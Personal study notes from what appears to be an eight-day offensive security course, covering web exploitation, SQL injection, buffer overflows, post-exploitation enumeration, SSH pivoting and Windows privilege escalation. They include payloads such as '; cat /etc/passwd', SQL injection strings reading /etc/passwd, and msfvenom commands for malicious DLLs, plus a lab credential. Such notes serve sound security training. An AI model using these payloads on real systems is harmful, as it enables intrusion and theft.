-----------------------------------------------------------------------------------------------------------------------------------------------------------
Day 1
-----------------------------------------------------------------------------------------------------------------------------------------------------------
  - 19 	EMVA-007-M 	rOVUm5ZPEn9ZwBQ 	10.50.23.5 (windows)/10.50.31.142(linux)
  - https://sec.cybbh.io/public/security/latest/index.html
  - /usr/share/nmap/scripts
  - nmap [ip] [options] --script [script name]
  - XFREERDP Syntax: xfreerdp /v:10.50.x.x /u:student /p:password /size:1920x1000 +clipboard
-----------------------------------------------------------------------------------------------------------------------------------------------------------
Day 2
-----------------------------------------------------------------------------------------------------------------------------------------------------------
  - Web Exploitation Part 1:
    - HTTP methods:
      - GET = retrieves information
      - POST = sends information
      - HEAD = requests headers 
      - PUT = replaces all representations of a resource with the uploaded content
      - 10X == Informational
      - 2XX == Success
      - 30X == Redirection
      - 4XX == Client Error
      - 5XX == Server Error
      - Robots.txt = instructions for web crawlers    
      - http-enum script: nmap --script http-enum [ip address]
    - Cross-Site Scripting (XSS):
      - Insertion of arbitrary code into a webpage that executes untrusted code on a victims browser
      - Unsanatized GET, POST, and PUT methods allow JS to be placed on websites
      - Reflected XSS:
        - Most common form
        - Puts code in the URL
        - Delivered through intermediate media
      - Stored XSS:
        - Resides on vulnerable site
        - Only requires user to visit page
      - Directory Traversal
        - Ability to read/execute outside web server directory
        - Uses relative paths to manipulate
        - ../../../../etc/passwd
        - SSI injection code <!DOCTYPE html>
          <html>
          <body>
          <h1>A Web Page</h1>
          <p id="demo">A Paragraph</p>
          <button type="button" onclick="myFunction()">Try it</button>
          <script>
          function myFunction() {
             document.getElementById("demo").innerHTML = "Paragraph changed.";
          }
          </script>
          </body>
          </html>
      - Command Injection:
        - Application on the server is vulnerable, allowing execution of arbitrary commands
        - User input is not validated; common example is a SOHO router with a web page to allow ping
        - run the following to chain/stack our arbitrary command: ; cat /etc/passwd
-----------------------------------------------------------------------------------------------------------------------------------------------------------
Day 3
-----------------------------------------------------------------------------------------------------------------------------------------------------------
  - SQL:
    - https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
    - mysql opens sql 
    - select * from session.car; - shows everything from that session
    - select * from union select [table], [columns], 1, 2
    - SELECT - Extracts data from a database
    - UNION - Used to combine the result-set of two or more SELECT statements
    - USE - Selects the DB to use
    - UPDATE - Updates data in a database
    - DELETE - Deletes data from a database
    - INSERT INTO - Inserts new data into a database
    - CREATE DATABASE - Creates a new database
    - ALTER DATABASE - Modifies a database
    - CREATE TABLE - Creates a new table
    - ALTER TABLE - Modifies a table
    - DROP TABLE - Deletes a table
    - CREATE INDEX - Creates an index (search key)
    - DROP INDEX - Deletes an index
    - https://www.w3schools.com/SQL/sql_syntax.asp
    - Operator Condition SQL Example:
       - =, !=, < <=, >, >= 	Standard numerical operators 	col_name != 4
       - BETWEEN … AND … 	Number is within range of two values (inclusive) 	col_name BETWEEN 1.5 AND 10.5
       - NOT BETWEEN … AND … 	Number is not within range of two values (inclusive) 	col_name NOT BETWEEN 1 AND 10
       - IN (…) 	Number exists in a list 	col_name IN (2, 4, 6)
       - NOT IN (…) 	Number does not exist in a list 	col_name NOT IN (1, 3, 5)
    - Is information_schema Database available?
    - GET Request versus POST Request HTTP methods
    - Unsanitized: input fields can be found using a Single Quote ⇒ '
    - Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
    - Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')
    - Server-Side Query Processing:
      - User enters JohnDoe243 in the name form field and pass1234$ in the pass form field.
      Before Input:
        - SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
      After Input:
        - SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
      Injecting Your Statements:
        - User enters tom' OR 1='1 in the name and pass fields.
        - Truth Statement: tom' OR 1='1
        - Server Query Appears as:
          - SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
        - Doing this in the URL using a get method can show username info
        - Selection=2 Union Select 1,2,3 = shows a layout of what tables go in what order using GET method
        - [Table]=2 Union Select 1,2,3,load_file("/etc/passwd)",5 # = loads a file using POST method 
        - php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()        
        - Selection=2 Union Select table_schema, table_name FROM information_schema.table = loads information schema table, showing all info about the database
        - [Table] UNION SELECT @@version.database(),3,name,size FROM session.[session name]; 5 - POST
     - Information Schema:
       - On SQL server: 
         To showSELECT * FROM sys.databases;
         EXEC sp_databases; 
-----------------------------------------------------------------------------------------------------------------------------------------------------------
Day 4
-----------------------------------------------------------------------------------------------------------------------------------------------------------
  - Reverse Engineering
    - X86_64 Assembly:
      - %rax - return the first register
      - %rbp - the base pointer that keeps track of the base of the stack
      - %rsp - the stack pointer that points to the top of the stack
      - HEAP - Memory that can be allocated and deallocated
      - STACK - A contiguous section of memory used for passing arguments
      - GENERAL REGISTER - A multipurpose register that can be used by either programmer or user to store data or a memory location address
      - CONTROL REGISTER - A processor register that changes or controls the behavior of a CPU
      - FLAGS REGISTER - Contains the current state of the processor
-----------------------------------------------------------------------------------------------------------------------------------------------------------
Day 5
-----------------------------------------------------------------------------------------------------------------------------------------------------------
  - Yeah
-----------------------------------------------------------------------------------------------------------------------------------------------------------
Day 6
-----------------------------------------------------------------------------------------------------------------------------------------------------------
  - Exploit Development
    - A general protection fault can occur when stomping on kernel space virtual memory. On 64-bit systems, user-space virtual memory is allocated and locked using the lower 47 bits of the address; therefore, it is limited to the address range of 0x0 to 0x7fffffffffff. 
      If the instruction pointer (IP) is greater than 0x7fffffffffff, you will get a general protection fault, and your buffer overflow attempt will fail. 
    - https://wiremask.eu/tools/: buffer overflow pattern
    - When in Debugger: !mona modules and !mona jmp -r esp -m "[.dll you're looking for]" will show jump statements 
    - msfvenom - [system/exploit] lhost=[your ip] lport=[target port] -b "\x00\xff\x0A\x0D" -f python
      1: Analyze
        - Run the file command: "file [file name]" 
          - Identify: OS and architecture
          - Statically/dynamically linked
          - Debugging info (stripped/not stripped)
          - BuildID (identifier added during the linking process)
        - Run the strings command: "strings [file name]"
          - Embedded help
          - Error messages
          - Other string items
          - Can also expose packed binaries
    - GDB common commands:
      - disass <FUNCTION>   #   Disassemble portion of the program
      - Using the command 'pdisass' instead of 'disass' will have the peda plugin highlight known vulnerable functions with red text. 
      - info <...>  #   Supply info for specific stack areas
      - x/256c $<REGISTER>  #   Read characters from specific register
      - break <address>  #   Establish a break point
    - ./program <<< $(python exploit.py) - if asked for user input
    - ./program $(python exploit.py) takes buffer as argument
    - gdb-ped: run <<< $(python exploit.py)
    - gdp-ped: run $(python exploit.py)
-----------------------------------------------------------------------------------------------------------------------------------------------------------
Day 7
-----------------------------------------------------------------------------------------------------------------------------------------------------------
  - Post Exploitation
    - Host Enumeration:
      - User Enumeration:
        - Windows - net user
        - Linux - cat /etc/passwd
      - Process Enumeration:
        - Windows - tasklist /v
        - Linux - ps -elf 
      - Service Enumeration:
        - Windows - tasklist /service
        - Linux - chkconfig / systemctl --type=service
      - Network Connection Enumeration
        - Windows - ipconfig /all
        - Linux - ipconfig -a / ip a
      - Data Exfiltration
        -  ssh <user>@<host> | tee - tee both writes contents of output to stdout and to a file
    - Demo - Linux:
      - First Commands:
        - w, who, whoami
        - hostname
        - ip a
        - ps -elf
          - Check any running scripts if they look suspicious to see what they're actually doing
        - uname -a
        - netstat -antp / ss -ntlp
        - sudo -l 
          - if you see a program in sudo -l check it out to do privelege escalation
        - cat /etc/passwd
        - cat /etc/hosts - DNS information
    - Demo - Windows (port 3389 - RDP will always be open):
      - First Commands (Command Line):
        - whoami
        - hostname
        - ipconfig /all
        - netstat /anot
        - net user
        - net localgroup
          - If attempting to make a privileged user, make sure you add them to the administrators group AND remote desktop users group so you can RDP as them
        - tasklist
        - look at the file system through the GUI
          - C:\Public and System32 
        - tasklist /svc
          - the Services program will show services in a GUI format
        - nslookup
        - C:\Windows\System32\Drivers\etc\hosts - local DNS information
    - Control Sockets:
      - first thing you need is a file to hold your master sockets - use .ssh
      - mkdir cm (control masters)
      - cd into the director - /.ssh/cm
      - ssh -M (master) -S (slave) ~/.ssh/cm/[whatever name you want - likely the hostname of the target box] [user]@[IP address]
      - sshing succesfully will create a socket in the /cm directory named whatever you named the socket as
      - ssh -o "ControlPath=~/.ssh/cm/[socket name]" [Placeholder that ssh needs; anything can go here from the letter a to the socket name]
      - don't close the first window; it will close the socket
      - ssh -M (master) -S (slave) ~/.ssh/cm/[whatever name you want - likely the hostname of the target box] -o "ControlPersist=10m" [user]@[IP address]
      - the above command makes the socket stay open if nothing is connected to it, even if you close the original window
      - ssh -O [big O] forward [specifies port forwarding] -L [random high port]:[target IP]:[ssh port] -S [socket] ~/.ssh/cm/[specific socket] T1
      - connecting to the local port is the same as normal - ssh [username]@[localhost/0.0.0.0] -p [RHP] 
      - establishing a new tunnel uses the same syntax as before; it will still use the same Master Socket but take you to a different target
      - ssh -M -S ~/.ssh/cm/[New Socket Name] -o "ControlPersist=10m" -p [target port] [username]@[localhost/0.0.0.0] 
      - the above command sets up a new mastersocket on your second target to continue going through the network
      - ssh -o "ControlPath=~/.ssh/cm/[new socket]" [placeholder character] will take you to the new target ip through the new socket
      - scp -P [socket local RHP] [usn]@[localhost/0.0.0.0]:/file/destination/path /your/local/directory/and_file_name.txt
      - NUCLEAR LAUNCH CODES - 8675409 (POSSIBLE FLAG ^_^)
      - scp -o "ControlPath=~/.ssh/cm/[Master Socket]" [placeholder]:/directory/you_want_to_grab_from/and_file.txt /your/local/home/directory.txt
      - above command: scping using master socket options
      - ssh -O [big O] cancel [specifies port forwarding] -L [random high port]:[target IP]:[ssh port] -S [socket] ~/.ssh/cm/[specific socket] T1       
      - above command closes open sockets - same as opening them except change "forward" to "cancel"
      - To automate connecting to grey host/jump box - THIS COMMAND WILL AUTOMATICALLY CREATE A MASTER SOCKET  NAMED WHAT YOU SPECIFY IN THE .SSH DIRECTORY:
        - touch /home/student/.ssh/config
        - vim /home/student/.ssh/config
        ------Script Lines------
          Host [JB hostname]
             HostName [IP]
             User student
             ControlPath ~/.ssh/cm/[master socket path]
             ControlPersist 10m
             ControlMaster auto
        ------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------
Day 8
-----------------------------------------------------------------------------------------------------------------------------------------------------------
  - Privilege Escalation, Persistence & Covering Your Tracks - Windows
    - DLL Search Order 
      - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
      - Executables check the followings locations (in order):
        - Directory the application was run from
        - Directory specified in the C+ fuction GetSystemDirectory()
        - The directory specified in the C+ function GetWindowsDirectory()
        - The current directory
    - Windows Integrity Mechanism
      - Integrity Levels
        - Unrtustred
        - Low
        - Medium
        - high 
        - system
    - Demos:
      - Tasks:
        - schtasks /query /fo LIST /v
        - If you know what you're looking for pipe the command to find 
        - Task Scheduler is much more helpful
        - When finding a suspicious task in Task Scheduler, check the location of the scheduled task to see where it's being run from and if it can be manipulated
        - ProcMon can help determine what .dlls a task is looking for, as well as whether or not a task is vulnerable to hijacking
        - Put task/.exe in the procmon filter to see where and what the task is calling for
        - Execute the file as well to monitor it in real time
      - Procmon Filters:
        - Process Name Contains: [task]
        - Path contains .dll
        - Result contains NAME NOT FOUND
      - Msfvenom:
        - Msfvenom can compile malicious binaries and .dlls
        - Compiling .dll: msfvenom -p windows/exec CMD='cmd.exe /C "command you want to run" > C:\Users\[user to save to]\Desktop\[.dll file name].txt 
          -b "\x00" -f dll > [file name where you want to save it on the linux box] 
        - Compiling binary: msfvenom -p windows/exec CMD='cmd.exe' /C "whoami/[command you want to be run]" > C:\Users\[user]\Desktop\[file name] 
          -b "\x00" -f exe > [file name].exe
        - SCP from Windows grabbing file from Linux
      - Services:
        - Use the Services process to check active/scheduled services
        - Filter on description to see user made services
        - Check the properties of the service to see what it's looking for when it's trying to run
        - If you don't have permissions to start a service, reboot the machine to automatically fire them on startup
      - Keys:
        - Check Regedit if you haven't been able to find a specific binary to look at in either Services or Task Scheduler
        - look at HKLM\software\microsoft\windows\currentversion\[either run or run once]
        - HKCU is the same, except it will only run or be loaded when that specific user logs into the system+
        - Only a privileged user [i.e. admin] can edit keys
      - Logging: 
        - Auditpol /get /category * | findstr "Success and Failure" will show all auditing categories, what's being logged, and how it's being logged
        - Event Viewer can load log files for viewing
        - Security, application, and system logs are specifically important
        - 4624 is the logon event id
